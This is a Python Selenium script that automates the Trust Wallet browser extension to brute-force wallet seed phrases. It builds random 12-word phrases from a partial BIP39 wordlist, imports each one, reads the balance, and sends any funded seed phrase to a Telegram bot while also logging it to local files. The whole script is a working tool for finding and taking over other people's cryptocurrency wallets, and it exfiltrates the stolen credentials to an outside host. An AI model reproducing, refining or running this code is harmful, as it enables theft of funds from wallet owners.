from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import random
import time
import requests
import threading
dataset = []
def snd2tg(data):
    tg = 'https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHAT_ID&text='
    requests.get(tg + data)

# Path to your ChromeDriver
chromedriver_path = './driver/chromedriver.exe'

def checkSeedPhrase(words):
    # Path to your Trust Wallet CRX file 
    
    crx_path = './trustwallet/trustwallet.crx'

    # Initialize Chrome options
    options = webdriver.ChromeOptions()
    options.add_extension(crx_path)

    # Create a WebDriver instance
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=options)
    # Wait implicitly for elements to be found
    driver.implicitly_wait(10)
    time.sleep(6)
    # Navigate to the specific page within the Trust Wallet extension
    extension_url = 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html#/onboarding'
    driver.get(extension_url)
    time.sleep(6)
    try:
        # Wait for the import/recover wallet button to be clickable and click it
        import_button = driver.find_elements(By.CLASS_NAME,'justify-between')[1]
        import_button.click()

        # Wait for the seed phrase input field to be visible
        time.sleep(2)
        password_inputs = driver.find_elements(By.XPATH, "//input[@type='password']")
        
        # Define the value you want to send to each password input element
        value_to_send = "Nouredinekn1234@"

        # Iterate over each password input element and send keys
        for inp in password_inputs:
            inp.send_keys(value_to_send)

        driver.find_elements(By.XPATH, "//input[@type='checkbox']")[0].click()

        # Click the button
        driver.find_elements(By.XPATH, "//button[@type='submit']")[-1].click()
        
        while True:
            all_handles = driver.window_handles

            # Switch to the first tab (assuming it's the initial handle)
            first_tab_handle = all_handles[0]
            driver.switch_to.window(first_tab_handle)
            while True:
                random_phrase = ' '.join(random.sample(words, 12))
                sorted_phrase = ' '.join(sorted(random_phrase.split()))
                if sorted_phrase not in dataset:
                    dataset.append(sorted_phrase)
                    seedphrase=random_phrase.split(' ')
                    break
            print(seedphrase)
            c=1
            for i in seedphrase:
                inp=driver.find_elements(By.XPATH, f"//input[@placeholder='Word #{c}']")[0]
                inp.send_keys(i)
                c+=1
            try:
                driver.find_elements(By.XPATH, "//button[@type='submit']")[-1].click()
                driver.find_elements(By.CLASS_NAME, "default-button")[0].click()
                time.sleep(6)
                driver.find_elements(By.CLASS_NAME, "default-button")[0].click()
                time.sleep(6)
                driver.find_elements(By.CLASS_NAME, "default-button")[-1].click()
                time.sleep(6)
                driver.find_elements(By.CLASS_NAME, "default-button")[-1].click()
                time.sleep(6)
                driver.find_elements(By.CLASS_NAME, "default-button")[-1].click()
                time.sleep(6)
                        # Get balance
                balance =driver.find_elements(By.TAG_NAME, "h2")[-1].text.strip()
                print(balance)
                if '0.0' not in balance:
                    snd2tg(f'_TRUST WALET HIT _  \n: balances: {balance} \n seedphrase: {seedphrase}')
                    open('trustwallet_with_balance.txt','a',encoding='utf-8').write(f'_TRUST WALET HIT _ \n: balances: {balance}  \n seedphrase: {seedphrase} \n')
                open('trustwallet_valid.txt','a',encoding='utf-8').write(f'_TRUST WALET HIT _ \n: balances: {balance}  \n seedphrase: {seedphrase} \n')
                break
            except:
                driver.find_elements(By.CLASS_NAME, "text-primary")[0].click()
                pass
                


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        driver.quit()

# Generate random phrases on the fly
words = '''abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artifact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cart carve case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise demo deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dine dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embrace emerge emotion employ empower empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand expect expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith fall false fame family famous fan fancy fantasy farm fashion fat fatal father fatigue fault favorite feature february federal fee feed feel female fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee fleet flesh flight flip float flock flood floor flour flow flower fluid flush fly focus fold follow food foot force forest forget fork fortune forward fossil foster found fragile frame free freeze fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace furnish future fuzzy gain galaxy gallery game gap garage garden garlic garment gas gasp gate gather gauge gaze gear gender gene general genius genre gentle genuine gesture ghost giant gift giggle ginger girl give glad glance glare glass glide glimpse global gloom glory glove glow glue goal goat goddess gold good goose gossip govern gown grab grace grain grant grape graph grasp grass grateful gravity great green grid grief grill grip groan gross group grow growth guard guess guest guide guilt guitar gull gum gun gym habit hair half hammer hand handle handsome hang happen happy harbor hard harsh harvest hat hate have hawk hazard head health heap hear heart heat heavy hedge height helicopter hello helmet help hero hidden hide high hill hint hip hire history hobby hold hole holiday hollow holy home honey honor hood hope horn horror horse hospital host hotel hour house hover huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea ideal identify idle ignore ill illegal illness image imagine imitate immense immune impact impose improve impulse inch include income increase index indicate indoor industry infant infect inflate inform inherit initial inject injury inmate inner innocent input inquire insane insect inside inspect inspire install intend intense interest interior internal internet invest invite involve iron island isolate issue item ivory jacket jail jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk jury just justice keen keep ketchup kettle key kick kid kidney kind king kiss kit kitchen kite knee knife knight knit knock know label labor ladder lady lake lamp language large laser last late laugh laundry lava law lawn lawyer layer lazy leader leaf league leak lean learn leave lecture left leg legal legend lemon lend length lens leopard less lesson letter level lever library license lick lid life lift light like limb limit link lion liquid list listen little live lizard load loan local lock logic lonely long loop loose lord lose lot loud love loyal luck luggage lumber lunar lunch lung luxury machine mad magic magnet maid mail main major make male mall man manage mandate mango mansion manual maple marble march margin marine market marriage mask mass master match material math matrix matter maximum maze meadow meal mean measure meat medal media medical medium meet melody melt member memory mention menu mercy merge merit merry mess metal method middle midnight milk million mimic mind mine minor minute miracle mirror misery miss mistake mix mobile model modify moment money monitor monkey monster month mood moon moral more morning mortal mother motion motor mountain mouse move movie much mud muffin mug multiple muscle museum music must mutual mystery myth nail name napkin narrow nation nature near neat neck need negative neglect neither nephew nerve nest net network neutral never news next nice niece night noble noise nominate normal north nose note nothing notice novel now nuclear number nurse nut nylon oak object observe obtain obvious occur ocean october odd offer office often oil old olive olympic omit once one onion online only open operate opinion oppose option orange orbit order ordinary organ orient original orphan other outdoor outer outfit outline output outside oval oven over own owner oxygen oyster ozone pace pack pact paddle page pair palace pale palm panda panel panic pants paper parade parent park part party pass patch path patient patrol pattern pause pave payment peace peach peanut pear peasant pedal peel pegasus pen pencil penalty people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pillow pilot pink pioneer pipe pistol pitch pizza place plague plain plan planet plant plastic plate play plea please pledge plenty plot plug plunge plus poem poet point poison polar pole police polish polite pond pony pool popular portion position possible post potato potential pottery powder power practice praise predict prefer prepare present pretty prevent price pride primary prince print priority prison private prize problem process produce profit program project promise promote proof property propose protect proud prove provide public pudding pull pulse pumpkin punch pupil puppy purchase pure purple purpose purse push put puzzle pyramid quality quantity quarter queen quick quiet quilt quit quiz quote rabbit race rack radar radio raft rage rain raise rally ramp ranch random range rapid rare rate rather raven raw razor reach ready real reason rebel rebuild recall receive recipe record recover recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remote remove render renew rent repair repeat replace reply report request require rescue resemble resist resource respect respond result retire return reunion reveal review revive reward rhythm rice rich ride ridge rifle right rigid ring riot ripple rise risk ritual rival river road roast robot robust rock rocket rod role roll romance roof room rooster root rope rose rotate rough round route royal rubber rude rug ruin rule run rural rush sad saddle safe sail salad salary sale salmon salon salt salute same sample sand satisfy sauce save say scale scan scare scatter scene scheme school science scoop scope score scout scrap scream screen script scroll scrub sea search season seat second secret section secure seed seek seem segment select self sell seminar senior sense sentence separate sequence series serious serve service session settle seven shadow shake shallow share sharp shed sheep sheet shelf shell shelter shift shine ship shirt shock shoe shoot shop short shot should shout show shred shrimp shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister sit size skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight slim slip slogan slow slush small smart smell smile smoke smooth snack snake snap sniff snow soap social sock soda soft solar soldier solid solve someone song soon sorry sort soul sound soup source south space spare speak special speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stool story stove strain straw street strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun super supply supreme sure surface surge surprise surround survey suspect sustain swallow swamp swap swear sweet swim swing switch sword symbol system table tackle tag tail talent talk tank tape target task taste taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing think this thorn those three thrive throw thumb thunder ticket tide tiger tilt timber time tiny tired tissue title toast tobacco today toddler toe together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable uncle uncover under undo unfair unfold unhappy uniform unique unit universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban urge usage use useful usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very vessel veteran viable vibrant vicious victory video view village vintage violin virtual virus visit visual vital vivid vocal'''.replace('\n','').split(' ')


def thread():
    threadnum = 5
    threads = []
    while True:
        thread = threading.Thread(target=checkSeedPhrase, args=(words, ))
        threads.append(thread)
        thread.start()
        if len(threads) == threadnum:
            for i in threads:
                i.join()

            threads = []
            continue    
thread()
